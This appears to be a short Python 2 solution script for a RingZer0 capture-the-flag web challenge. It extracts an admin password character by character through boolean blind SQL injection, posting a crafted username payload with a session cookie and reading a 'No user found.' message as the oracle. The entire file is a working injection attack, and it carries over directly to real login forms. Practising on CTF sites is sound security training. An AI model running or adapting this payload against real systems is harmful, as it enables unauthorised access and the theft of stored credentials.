#!/usr/bin/python2
# -*- coding: utf-8 -*-

import requests, string

url = "http://ringzer0team.com/challenges/5"
theCookie = {"PHPSESSID": "XXXXXXXXXXXXXXXXXXXXXX"}

flag = ""
for index in range(1, 15+1):
    for each_char in string.digits + string.lowercase + string.uppercase:
        payload = {"username": "admin') and ascii(substr(password, %s, 1))=%s or ('" %( index, ord(each_char) ), "password": "osef" }
        response = requests.post( url, data=payload, cookies=theCookie ).text
        if "No user found." not in response:
            flag += each_char
            print flag
            break
